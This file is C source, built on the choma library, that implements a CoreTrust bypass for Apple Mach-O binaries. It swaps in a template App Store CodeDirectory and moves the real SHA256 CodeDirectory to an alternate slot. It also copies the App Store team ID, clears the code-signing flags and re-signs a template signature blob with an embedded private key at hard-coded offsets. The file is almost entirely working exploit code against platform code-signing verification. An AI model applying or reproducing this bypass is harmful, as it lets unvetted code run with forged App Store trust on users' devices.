#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/Signing.h>
#include <choma/SignOSSL.h>
#include <choma/CodeDirectory.h>
#include <choma/Base64.h>
#include "Templates/AppStoreCodeDirectory.h"
#include "Templates/SignatureBlob.h"
#include "Templates/DecryptedSignature.h"
#include "Templates/PrivateKey.h"

// We can use static offsets here because we use a template signature blob
#define SIGNED_ATTRS_OFFSET 0x13C6 // SignedAttributes sequence
#define HASHHASH_OFFSET 0x1470 // SHA256 hash SignedAttribute
#define BASEBASE_OFFSET 0x15AD // Base64 hash SignedAttribute
#define SIGNSIGN_OFFSET 0x1602 // Signature

#define DECRYPTED_SIGNATURE_HASH_OFFSET 0x13

int update_signature_blob(CS_DecodedSuperBlob *superblob)
{
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (!signatureBlob) {
        printf("Could not find signature blob!\n");
        return -1;
    }

    uint8_t fullHash[CC_SHA256_DIGEST_LENGTH];
    size_t dataSizeToRead = csd_blob_get_size(sha256CD);
    uint8_t *data = malloc(dataSizeToRead);
    memset(data, 0, dataSizeToRead);
    csd_blob_read(sha256CD, 0, dataSizeToRead, data);
    CC_SHA256(data, (CC_LONG)dataSizeToRead, fullHash);
    free(data);
    uint8_t secondCDSHA256Hash[CC_SHA256_DIGEST_LENGTH];
    memcpy(secondCDSHA256Hash, fullHash, CC_SHA256_DIGEST_LENGTH);
    // Print the hash
    printf("SHA256 hash: ");
    for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
        printf("%02x", secondCDSHA256Hash[i]);
    }
    printf("\n");

    size_t base64OutLength = 0;
    char *newBase64Hash = base64_encode(secondCDSHA256Hash, CC_SHA1_DIGEST_LENGTH, &base64OutLength);
    if (!newBase64Hash) {
        printf("Failed to base64 encode hash!\n");
        return -1;
    }

    // Print the base64 hash
    printf("Base64 hash: %.*s\n", CC_SHA256_DIGEST_LENGTH, newBase64Hash);

    int ret = csd_blob_write(signatureBlob, HASHHASH_OFFSET, CC_SHA256_DIGEST_LENGTH, secondCDSHA256Hash);
    if (ret != 0) {
        printf("Failed to write SHA256 hash to signature blob!\n");
        free(newBase64Hash);
        return -1;
    }
    
    ret = csd_blob_write(signatureBlob, BASEBASE_OFFSET, base64OutLength, newBase64Hash);
    if (ret != 0) {
        printf("Failed to write base64 hash to signature blob!\n");
        free(newBase64Hash);
        return -1;
    }

    free(newBase64Hash);

    unsigned char *newSignature = NULL;
    size_t newSignatureSize = 0;

    unsigned char newDecryptedSignature[0x33];
    memset(newDecryptedSignature, 0, 0x33);
    memcpy(newDecryptedSignature, DecryptedSignature, 0x33);

    // Get the signed attributes hash
    unsigned char signedAttrs[0x229];
    memset(signedAttrs, 0, 0x229);
    csd_blob_read(signatureBlob, SIGNED_ATTRS_OFFSET, 0x229, signedAttrs);
    signedAttrs[0] = 0x31;
    
    // Hash
    uint8_t fullAttributesHash[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(signedAttrs, (CC_LONG)0x229, fullAttributesHash);
    memcpy(newDecryptedSignature + DECRYPTED_SIGNATURE_HASH_OFFSET, fullAttributesHash, CC_SHA256_DIGEST_LENGTH);

    newSignature = signWithRSA(newDecryptedSignature, DecryptedSignature_len, CAKey, CAKeyLength, &newSignatureSize);

    if (!newSignature) {
        printf("Failed to sign the decrypted signature!\n");
        return -1;
    }

    if (newSignatureSize != 0x100) {
        printf("The new signature is not the correct size!\n");
        free(newSignature);
        return -1;
    }

    ret = csd_blob_write(signatureBlob, SIGNSIGN_OFFSET, newSignatureSize, newSignature);
    free(newSignature);
    return ret;
}

int apply_coretrust_bypass(const char *machoPath)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed?\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        return -1;
    }

    printf("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    printf("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }

    // Append new template blob
    signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, (CS_GenericBlob *)TemplateSignatureBlob);
    csd_superblob_append_blob(decodedSuperblob, signatureBlob);

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)
    // 6. Signature blob

    printf("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        return -1;
    }

    // Set the team ID of the real code directory to the AppStore one
    if (csd_code_directory_set_team_id(realCodeDirBlob, appStoreTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        return -1;
    }

    printf("TeamID set to %s!\n", appStoreTeamID);
    free(appStoreTeamID);

    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
    csd_code_directory_set_flags(realCodeDirBlob, 0);

    printf("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    printf("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    printf("Updating code slot hashes...\n");
    csd_code_directory_update(realCodeDirBlob, macho);

    int ret = 0;
    printf("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    printf("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    printf("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}